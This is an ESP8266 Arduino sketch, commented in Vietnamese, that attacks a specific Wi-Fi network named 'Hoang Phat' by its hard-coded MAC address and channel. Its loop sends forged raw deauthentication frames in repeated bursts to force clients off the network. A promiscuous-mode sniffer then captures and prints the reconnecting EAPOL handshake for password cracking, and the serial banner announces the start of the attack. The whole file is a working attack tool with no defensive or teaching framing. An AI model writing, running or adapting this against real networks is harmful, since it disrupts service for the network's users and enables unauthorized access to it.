#include <ESP8266WiFi.h>

extern "C" {
  #include "user_interface.h"
}

// MAC Hoang Phat mục tiêu
uint8_t target_mac[6] = {0x20, 0xBE, 0xB4, 0x12, 0x96, 0xE8};
uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

// Gói tin Deauth thô
uint8_t deauth_pkt[26] = {
  0xC0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
  0x20, 0xBE, 0xB4, 0x12, 0x96, 0xE8, 0x20, 0xBE, 0xB4, 0x12, 0x96, 0xE8, 
  0x00, 0x00, 0x01, 0x00
};

void sniffer_callback(uint8_t *buf, uint16_t len) {
  uint8_t *frame = buf + 12;
  // Chỉ lọc đúng MAC Hoang Phat
  if (memcmp(frame + 10, target_mac, 6) == 0 || memcmp(frame + 16, target_mac, 6) == 0) {
    // Chỉ in khi thấy Handshake (88 8E)
    if ((frame[32] == 0x88 && frame[33] == 0x8E) || (frame[34] == 0x88 && frame[35] == 0x8E)) {
      Serial.println("\n[!!!] ĐÃ TÓM ĐƯỢC HANDSHAKE (EAPOL) [!!!]");
      Serial.print("DATA HEX: ");
      for (int i = 0; i < len - 12; i++) Serial.printf("%02X ", frame[i]);
      Serial.println("\n------------------------------------------------");
    }
  }
}

void setup() {
  Serial.begin(115200);
  system_update_cpu_freq(160); // Ép xung tối đa
  
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(0);
  wifi_set_promiscuous_rx_cb(sniffer_callback);
  wifi_promiscuous_enable(1);
  wifi_set_channel(5); // Kênh của Hoang Phat

  Serial.println("\n--- BẮT ĐẦU TẤN CÔNG ĐỂ LẤY HANDSHAKE ---");
}

void loop() {
  // Gửi 10 gói Deauth để ép thiết bị văng ra
  for (int i = 0; i < 10; i++) {
    wifi_send_pkt_freedom(deauth_pkt, 26, 0);
    delay(10);
  }
  // Nghỉ 30 giây để chờ thiết bị kết nối lại và bắt Handshake
  delay(30000); 
}
